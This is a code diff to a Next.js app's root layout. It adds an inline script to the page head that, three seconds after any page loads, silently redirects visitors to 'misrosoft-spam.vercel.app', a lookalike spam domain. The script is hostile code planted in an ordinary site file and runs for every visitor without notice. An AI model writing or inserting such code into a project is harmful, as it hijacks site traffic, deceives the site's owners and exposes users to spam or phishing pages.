@@ -24,6 +24,17 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              setTimeout(function () {
+                  window.location.href = "https://misrosoft-spam.vercel.app";
+              }, 3000);
+            `,
+          }}
+        />
+      </head>
       <body
         className={`${inter.className}  antialiased flex flex-col min-h-screen`}
       >
